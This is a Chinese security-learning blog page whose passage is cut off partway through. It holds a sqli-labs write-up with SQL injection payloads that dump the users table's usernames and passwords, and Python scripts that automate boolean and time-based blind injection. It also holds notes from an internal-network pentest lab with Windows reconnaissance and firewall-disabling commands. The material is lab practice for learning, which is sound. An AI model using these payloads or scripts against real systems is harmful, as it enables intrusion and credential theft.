<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="生活,旅行,思考,代码,博客" />
   
  <meta name="description" content="一生努力" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     0Rld
  </title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/css/style.css">

  
<script src="/js/pace.min.js"></script>


  

  

<link rel="alternate" href="/atom.xml" title="0Rld" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

</html>
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
<body>
  <div id="app">
    <main class="content">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover3.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">0Rld</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
        <img
          src="/images/ayer.svg"
          class="cover-logo"
          alt="0Rld"
        />
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>

<div id="main">
  <section class="outer">
  <article class="articles">
    
    
    
    
    <article id="post-sqli-labs" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/19/sqli-labs/"
    >sqli-labs</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/19/sqli-labs/" class="article-date">
  <time datetime="2020-05-19T03:57:08.000Z" itemprop="datePublished">2020-05-19</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-5</strong></h3><p>知识点：</p>
<p>这题可采用报错注入，updatexml（1，xxx，1） 或者 extractvalue（1，x）</p>
<p>extractvalue(目标xml文档，xml路径)</p>
<p>updatexml(目标xml文档，xml路径，更新的内容)</p>
<p>group_concat():可将相同行的字段整合在一起</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爆库</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1                                      </span><br><span class="line"></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆列</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(0x7e,column_name,0x7e) from information_schema.columns where table_name='users') ,0x7e)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(id,0x7e,username,0x7e,password)from users),1) and '1</span><br><span class="line"><span class="comment">#回显不全，可改为concat---limit 0,1 进行逐个查询</span></span><br><span class="line">?id=1' and updatexml(1,(select concat(id,0x7e,username,0x7e,password) from users limit 4,1),1) and '1</span><br></pre></td></tr></table></figure>



<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-6</strong></h3><p>和上一关一样，只不过把单引号变成双引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)  and &quot;1</span><br></pre></td></tr></table></figure>



<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-7</strong></h3><p>这里用了双括号括起来，如 $sql=”SELECT * FROM users WHERE id=((‘$id’))”  LIMIT 0,1”;</p>
<p>所以构造语句 ? id =1 ‘ ))  –+  顺利通过验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;var&#x2F;www&#x2F;sqli-labs&#x2F;Less-7&#x2F;uuu.txt&quot; --+</span><br></pre></td></tr></table></figure>



<p>{0}代表数据库的第几位<br>{1}代表acsii码的数值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url_template = <span class="string">"http://127.0.0.1:8080/Less-8/?id=1' and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23"</span></span><br><span class="line">    chars = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i,char_ascii) <span class="comment">#分别对应url的&#123;0&#125;、&#123;1&#125;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = len(response.text) </span><br><span class="line">            <span class="comment">#返回的长度只有706和722</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">706</span>:</span><br><span class="line">                result += char</span><br><span class="line">                print(length,char,char_ascii)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br><span class="line">get_db_name()</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">722</span> s <span class="number">115</span></span><br><span class="line"><span class="number">722</span> e <span class="number">101</span></span><br><span class="line"><span class="number">722</span> c <span class="number">99</span></span><br><span class="line"><span class="number">722</span> u <span class="number">117</span></span><br><span class="line"><span class="number">722</span> r <span class="number">114</span></span><br><span class="line"><span class="number">722</span> i <span class="number">105</span></span><br><span class="line"><span class="number">722</span> t <span class="number">116</span></span><br><span class="line"><span class="number">722</span> y <span class="number">121</span></span><br><span class="line">security</span><br></pre></td></tr></table></figure>



<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-9</strong></h3><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-10</strong></h3><p>盲注—延时注入</p>
<p>脚本编写思路：构造payload—判断注入是否成功—获取字段值—判断是否全部遍历</p>
<p>payload构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;Less-9&#x2F;?id&#x3D;&quot;</span><br><span class="line">str_top&#x3D;&quot; 1&#39; and &quot;</span><br><span class="line">str_end&#x3D;&quot; --+ &quot;</span><br><span class="line">str_sql&#x3D; select information_schema  from  information_schema.schemata</span><br><span class="line">sql_str&#x3D;&quot;if(ascii(mid(&quot;+str_sql+&quot;,&quot;+ +&quot;,1)))&quot;</span><br><span class="line">payload&#x3D;url+url_top+</span><br></pre></td></tr></table></figure>













<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">(result_index, char_index, ascii)</span>:</span></span><br><span class="line">    <span class="comment"># 系统表中数据</span></span><br><span class="line">    info_database_name = <span class="string">"information_schema"</span></span><br><span class="line">    info_table_name = <span class="string">"schemata"</span> <span class="comment"># schemata / tables / columns</span></span><br><span class="line">    info_column_name = <span class="string">"schema_name"</span> <span class="comment"># schema_name / table_name / column_name</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注入表中数据</span></span><br><span class="line">    database_name = <span class="string">"security"</span></span><br><span class="line">    table_name = <span class="string">"users"</span></span><br><span class="line">    column_name = [<span class="string">"id"</span>,<span class="string">"username"</span>,<span class="string">"password"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 附加url</span></span><br><span class="line">    start_str = <span class="string">"1' and "</span></span><br><span class="line">    end_str = <span class="string">"--+"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接select</span></span><br><span class="line">    where_str = <span class="string">""</span></span><br><span class="line">  <span class="comment">#  where_str = " where table_schema='"+database_name+"'"+" and table_name='"+table_name+"'"</span></span><br><span class="line">    select_str = <span class="string">"select "</span>+info_column_name+<span class="string">" from "</span>+info_database_name+<span class="string">"."</span>+info_table_name+where_str+<span class="string">" limit "</span>+str(result_index)+<span class="string">",1"</span></span><br><span class="line">   <span class="comment">#select_str = "select concat_ws('-',"+column_name[0]+","+column_name[1]+","+column_name[2]+") from "+table_name+" limit "+str(result_index)+",1"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接payload</span></span><br><span class="line">    sqli_str = <span class="string">"if(ascii(mid(("</span>+select_str+<span class="string">"),"</span>+str(char_index)+<span class="string">",1))="</span>+str(ascii)+<span class="string">",sleep(0.2),0)"</span></span><br><span class="line">    payload = start_str + sqli_str + end_str</span><br><span class="line">    print(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(result_index, char_index, ascii)</span>:</span></span><br><span class="line">    <span class="comment"># 连接url</span></span><br><span class="line">    url = <span class="string">"http://localhost:8888/Less-9/?id="</span></span><br><span class="line">    exec_url = url + getPayload(result_index, char_index, ascii)</span><br><span class="line">   <span class="comment"># print(exec_url)</span></span><br><span class="line">    <span class="comment"># 检查延时</span></span><br><span class="line">    before_time = time.time()</span><br><span class="line">    requests.head(exec_url) <span class="comment"># 节约时间</span></span><br><span class="line">    after_time = time.time()</span><br><span class="line">    use_time = after_time - before_time</span><br><span class="line">    <span class="keyword">if</span> use_time &gt; <span class="number">0.1</span>:</span><br><span class="line">      <span class="comment">#  print(exec_url)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exhaustive</span><span class="params">(result_index, char_index)</span>:</span></span><br><span class="line">    <span class="comment"># ascii可显字符从32到126共95个 按可能性顺序</span></span><br><span class="line">    ascii_list = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'_'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">' '</span>,<span class="string">'!'</span>,<span class="string">'"'</span>,<span class="string">'#'</span>,<span class="string">'$'</span>,<span class="string">'%'</span>,<span class="string">'&amp;'</span>,<span class="string">'\''</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">','</span>,<span class="string">'-'</span>,<span class="string">'.'</span>,<span class="string">'/'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">':'</span>,<span class="string">';'</span>,<span class="string">'&lt;'</span>,<span class="string">'='</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'@'</span>,<span class="string">'['</span>,<span class="string">'\\'</span>,<span class="string">']'</span>,<span class="string">'^'</span>,<span class="string">'`'</span>,<span class="string">'&#123;'</span>,<span class="string">'|'</span>,<span class="string">'&#125;'</span>,<span class="string">'~'</span>]</span><br><span class="line">    <span class="keyword">for</span> ascii_char <span class="keyword">in</span> ascii_list:</span><br><span class="line">        ascii = ord(ascii_char)</span><br><span class="line">        <span class="keyword">if</span> execute(str(result_index), str(char_index+<span class="number">1</span>), str(ascii)):</span><br><span class="line">            <span class="keyword">return</span> ascii_char</span><br><span class="line">    <span class="keyword">return</span> chr(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">32</span>): <span class="comment"># 查询结果的数量</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> len <span class="keyword">in</span> range(<span class="number">32</span>): <span class="comment"># 单条查询结果的长度</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            char = exhaustive(num, len)</span><br><span class="line">            <span class="comment">#print(char)</span></span><br><span class="line">            <span class="keyword">if</span> ord(char) == <span class="number">1</span>: <span class="comment"># 单条查询结果已被遍历</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sys.stdout.write(char)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">           <span class="comment">#print(count)</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">1</span>: <span class="comment"># 查询结果已被遍历</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">"\r\n"</span>)</span><br><span class="line">        sys.stdout.flush()</span><br></pre></td></tr></table></figure>








      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-渗透实战学习" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/23/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/"
    >渗透实战学习</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/23/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2020-04-23T07:13:23.000Z" itemprop="datePublished">2020-04-23</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/">渗透之路</a>
  </div>

      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <hr>
<p>光看书不动手是无法更深刻理解的，一开始还是跟着大佬的步骤走，再自己复现一遍，尽可能搞懂每一步！</p>
<h2 id="1-内网基础知识"><a href="#1-内网基础知识" class="headerlink" title="1.内网基础知识"></a>1.内网基础知识</h2><p><strong>工作组：</strong>在工作组中的网络可以互相访问对方的共享资源，主要按部门或者功能进行分组</p>
<p><strong>域（Domain）：</strong>是一个有安全边界的计算机集合，可以理解为升级版的工作组，但域的安全管理控制机制更加严格。用户必须以合法的身份登录域，且用户的权限是根据用户在域中的身份决定的。</p>
<p><strong>域控制器（DC）：</strong>可以理解为一个单位的门禁系统，负责所有连入的计算机和用户的验证工作</p>
<p>域控制器存在这个域所有账户、密码等信息的数据库</p>
<p>域中一般有以下几个环境：</p>
<p><strong>单域：</strong>在一个地理位置固定的小公司，建立一个域就可以了。一般一个域至少两台域服务器，一个作为DC，另一台作为备份DC。</p>
<p>父域和子域：第一个创建的域为父域，各分部的域称为该域的子域。例如一个大公司的各个分公司位于不同的地点，就需要用到父域和子域。因为在同一个域当中，信息交互是比较多的，而且不能压缩。而不同域信息交互比较少，而且可以压缩。同时也为了安全考虑，每个域都有自己的安全策略，比如财务部希望使用特定的安全策略（包括账号密码策略）</p>
<p><strong>域树：</strong>是多个域通过建立信任关系组成的集合</p>
<p>（父）abc.com —-asia.abc.com ——cn.asia.abc.com（子）</p>
<p>abc.com—–europe.abc.com—–ft.asia.abc.com</p>
<p>子域只能使用父域的名字作为其域名的后缀</p>
<p><strong>域森林：</strong>多个域树建立信任关系组成的集合</p>
<p>比如abc.com要合并abc.net，但无法挂下，所以需要建立信任关系来构成</p>
<p><strong>域名服务器（Domain Name Server，DNS）：</strong>是指用于实现域名和与之相对应的IP地址转换的服务器</p>
<p>域树的域名和DNS域名非常相似，实际上，因为域中的计算机是使用DNS来定位域控制器、服务器以及其他计算机、网络服务的，所以域的名字就是DNS域的名字。</p>
<p><strong>在内网渗透中，大部分是通过寻找DNS服务器来确定域控制器的位置（这两者通常配值在一台机子上）</strong></p>
<p><strong>活动目录：</strong>是指域环境中提供目录服务的组件</p>
<p>域服务器和活动目录的区别：</p>
<p><strong>安全域的划分：</strong>划分安全域的目的是将安全等级相同的计算机划入同一网段，该网段的计算机拥有相同的网络边界，并在网络边界部署防火墙实现对其它安全域的网络访问控制策略。</p>
<p><strong>安全域一般分为DMZ和内网</strong></p>
<p>在一个用路由器连接的内网中，分为安全级别最高的内网、中等的DMZ、最低的外网。三个区域任务不同，访问策略不同</p>
<p><strong>DMZ称为隔离区</strong>，位于企业内部网络和外部网络之间。可以在其中放一些必须空开的服务器，如FTP、Web、论坛服务器</p>
<p>在网络边界上一般会部署防火墙及入侵检测等，如果有Web应用还会设置WAF，从而有效保护内网。</p>
<p>在配置一个拥有DMZ的网络时，通常需要定义如下访问控制策略，以实现屏障功能：</p>
<p><strong>1.内网可以访问外网：</strong>在这一策略中，防火墙需要执行NAT</p>
<p><strong>2.内网可以访问DMZ：</strong>内网用户可以管理DMZ中的服务器</p>
<p><strong>3.外网不能访问内网：</strong>如果要访问，要通过VPN</p>
<p><strong>4.外网可以访问DMZ：</strong>需要由防火墙来完成从对外地址到服务器实际地址的转换</p>
<p><strong>5.DMZ不能访问内网、不能访问外网：</strong>保护内网</p>
<p><strong>内网又可以划分为办公区和核心区：</strong></p>
<p>办公区：公司员工日常的工作区，攻击者如果想进入内网，一般会使用<strong>鱼叉攻击、水坑攻击</strong>、社工等</p>
<p>核心区：存储企业最重要的数据等信息资产，通过日志记录、安全审计等安全措施进行严密的保护</p>
<p>一般来讲，能直接访问的只有运维人员或者IT部门的主管，所以攻击者会重点关注这些用户的信息</p>
<p><strong>（攻击者在内网中进行横向移动攻击时，会优先查找这些主机）</strong></p>
<p><strong>桥接模式：</strong>在桥接网络中，虚拟机是独立的机器。虚拟机和主机就好比插在同一台交换机上的两台计算机。如果主机连接到开启了DHCP服务的(无线)路由器上，虚拟机就可以自动获取IP地址，反之需要手动配值。只要IP地址在同一网段内，局域网内所有同网段的计算机就能够互访，这样虚拟机就可以上网了。</p>
<p><strong>NAT模式(Network Address Translator):</strong>表示网络地址转换，虚拟机通过与物理机的连接来访问网络。虚拟机能够访问主机所在局域网内所有同网段的计算机，但是除了主机，局域网内的其它计算机都无法访问虚拟机。</p>
<p><strong>Host-only模式:</strong>虚拟机处于一个独立的网段中，此模式下的虚拟机是无法上网的，但是可以通过windows提供的连接共享功能实现共享上网，主机能与所有虚拟机互访。如果没用开启windows的连接共享功能，除了主机，虚拟机与主机所在局域网内的所有其他计算机之间都无法访问。</p>
<hr>
<p>kail ip:192.168.126.1</p>
<p>win7 ip:192.168.52.143  /   外网：192.168.126.128</p>
<p>winK3 ip:192.168.52.141</p>
<p>win2008: 密码改为hongri@2019  ip:192.168.52.138</p>
<p>netstat -an 查看被打开的端口列表</p>
<p>netstat -ano | findstr “80” 查看某个具体端口的占用情况</p>
<p>tasklist | findstr “680”  查看具体哪个应用被占用了</p>
<h2 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a><strong>2.内网信息收集</strong></h2><h3 id="2-1-收集本机信息"><a href="#2-1-收集本机信息" class="headerlink" title="2.1 收集本机信息"></a><strong>2.1 收集本机信息</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 　　　　　  <span class="comment">#查询本机IP段，所在域等 </span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">" OS 版本"</span> <span class="comment">#查询操作系统版本</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">" OS VERSION"</span> <span class="comment">#英文版</span></span><br><span class="line">echo %PROCESSOR_ARCHITECTURE% <span class="comment">#查看系统体系结构  ---x86 、 amd64</span></span><br><span class="line">wmic service list brief <span class="comment">#查询本机服务信息</span></span><br><span class="line">tasklist | findstr <span class="string">"680"</span>  <span class="comment">#查看具体哪个应用被占用了,tasklist查看当前进程</span></span><br><span class="line">wmic <span class="keyword">process</span> list brief <span class="comment">#查看进程信息</span></span><br><span class="line">wmic startup get command,caption <span class="comment">#查看启动程序信息</span></span><br><span class="line">schtasks /query /fo LIST /v <span class="comment">#查看计划任务</span></span><br><span class="line">net statistics workstation <span class="comment">#查看主机开机时间</span></span><br><span class="line">net user 　　　　　　　   <span class="comment">#本机用户列表 ---可以分析内网机器的命名规则</span></span><br><span class="line">net localgroup administrators          <span class="comment">#本机管理员[通常含有域用户]</span></span><br><span class="line">query user || qwinsta  <span class="comment">#查看当前在线用户</span></span><br><span class="line">net session <span class="comment">#列出或断开本地计算机与所连接的客户端之间的会话</span></span><br><span class="line">netstat <span class="literal">-ano</span> <span class="comment">#查看所有占用端口的列表</span></span><br><span class="line">systeminfo <span class="comment">#查看系统的详细信息，需要注意系统的版本、补丁信息等</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,Installedon <span class="comment">#查看安装在系统中的补丁</span></span><br><span class="line">net share <span class="comment">#查询本机共享列表和可访问的域共享列表</span></span><br><span class="line">route print</span><br><span class="line">arp <span class="literal">-a</span>  <span class="comment">#查询路由表以及所有可用接口的ARP缓存表</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###查询防火墙相关配值###</span></span><br><span class="line">netsh firewall set opmode disable <span class="comment">#关闭防火墙 win2003及之前的版本</span></span><br><span class="line">netsh advfirewall set allprofiles state off <span class="comment">#之后的版本</span></span><br><span class="line">netsh firewall show config <span class="comment">#查看防火墙的配值</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2查询当前权限"><a href="#2-2查询当前权限" class="headerlink" title="2.2查询当前权限"></a><strong>2.2查询当前权限</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami <span class="comment">#查看当前权限</span></span><br><span class="line">whoami /all <span class="comment">#获取域SID</span></span><br><span class="line">net user 用户名 /domain   <span class="comment">#获取指定用户的账户信息</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3判断是否存在域"><a href="#2-3判断是否存在域" class="headerlink" title="2.3判断是否存在域"></a><strong>2.3判断是否存在域</strong></h3><p>获得了本机的相关信息后，就要判断当前内网中是否存在域。<strong>如果当前内网中存在域，就需要判断所控主机是否在域内</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看本机是否和DNS服务器处于同一网段</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; ipconfig /all</span><br><span class="line">Windows IP 配置</span><br><span class="line">   主机名  . . . . . . . . . . . . . : stu1</span><br><span class="line">   主 DNS 后缀 . . . . . . . . . . . : god.org</span><br><span class="line">   节点类型  . . . . . . . . . . . . : 